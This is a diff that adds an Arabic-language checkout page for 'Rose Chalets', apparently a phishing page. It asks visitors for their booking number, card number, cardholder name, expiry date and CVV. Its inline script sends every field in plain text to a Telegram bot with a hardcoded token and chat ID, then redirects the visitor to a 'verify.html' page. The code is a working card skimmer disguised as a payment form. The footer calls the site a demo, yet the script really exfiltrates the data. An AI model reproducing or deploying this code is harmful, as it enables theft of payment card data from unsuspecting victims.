@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>الدفع - Rose Chalets</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+
+  <header class="main-header">
+    <div class="container">
+      <h1 class="logo">🌹 الدفع - Rose Chalets</h1>
+    </div>
+  </header>
+
+  <main class="container">
+
+    <section class="booking">
+      <h2>معلومات الدفع</h2>
+      <form id="paymentForm">
+        <label for="bookingNumber">رقم الحجز:</label>
+        <input type="text" id="bookingNumber" name="bookingNumber" pattern="\\d{6}" maxlength="6" required />
+
+        <label for="cardNumber">رقم البطاقة 💳:</label>
+        <input type="text" id="cardNumber" name="cardNumber" maxlength="19" placeholder="1234 5678 9012 3456" required />
+
+        <label for="cardHolder">اسم حامل البطاقة 🧾:</label>
+        <input type="text" id="cardHolder" name="cardHolder" required />
+
+        <div style="display: flex; gap: 10px;">
+          <div style="flex: 1;">
+            <label for="expiryDate">تاريخ الانتهاء 📅:</label>
+            <input type="month" id="expiryDate" name="expiryDate" required />
+          </div>
+
+          <div style="flex: 1;">
+            <label for="cvv">CVV 🔒:</label>
+            <input type="text" id="cvv" name="cvv" maxlength="4" required />
+          </div>
+        </div>
+
+        <button type="submit">ادفع الآن</button>
+      </form>
+    </section>
+
+  </main>
+
+  <footer class="footer">
+    <p>⚠️ هذا الموقع تجريبي لأغراض العرض فقط - جميع الحقوق محفوظة © Rose Chalets</p>
+  </footer>
+
+  <script>
+    document.getElementById("paymentForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const token = "8022117794:AAHc6i8c6jZY_2IGHUQlQBJYGN2v9n0";
+      const chatId = "1008144314";
+
+      const bookingNumber = document.getElementById("bookingNumber").value;
+      const cardNumber = document.getElementById("cardNumber").value;
+      const cardHolder = document.getElementById("cardHolder").value;
+      const expiryDate = document.getElementById("expiryDate").value;
+      const cvv = document.getElementById("cvv").value;
+
+      const message = `
+💳 محاولة دفع جديدة:
+
+رقم الحجز: ${bookingNumber}
+رقم البطاقة: ${cardNumber}
+اسم حامل البطاقة: ${cardHolder}
+تاريخ الانتهاء: ${expiryDate}
+CVV: ${cvv}
+      `;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      }).then(response => {
+        if (response.ok) {
+          window.location.href = "verify.html";
+        } else {
+          alert("فشل في إرسال بيانات الدفع!");
+        }
+      });
+    });
+  </script>
+
+</body>
+</html>
